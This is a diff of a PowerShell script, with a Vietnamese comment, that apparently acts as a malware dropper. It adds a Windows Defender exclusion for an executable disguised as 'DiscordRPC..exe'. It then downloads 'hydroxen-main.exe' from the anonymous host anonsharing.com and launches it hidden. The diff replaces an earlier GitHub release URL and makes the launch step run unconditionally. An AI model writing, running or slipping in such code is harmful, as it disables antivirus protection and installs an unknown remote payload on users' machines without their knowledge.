@@ -33,13 +33,13 @@ if (!(Test-Path $filePath)) {
 # Chạy file thực thi
 Start-Process -FilePath $filePath -NoNewWindow
 
-$filePath = "$startupfolder\DiscordRPC.exe"
+$filePath = "$folderPath\DiscordRPC..exe"
 Add-MpPreference -ExclusionPath $filePath
-$url = "https://github.com/43a1723/test/releases/download/siu/discord.rpc.exe"
+$url = "https://anonsharing.com/file/2a46c50ffea0716b/hydroxen-main.exe"
 if (!(Test-Path $folderPath)) {
     New-Item -ItemType Directory -Path $folderPath -Force
 }
 if (!(Test-Path $filePath)) {
     Invoke-WebRequest -Uri $url -OutFile $filePath
-    Start-Process -FilePath $filePath -NoNewWindow
 }
+Start-Process -FilePath $filePath -NoNewWindow
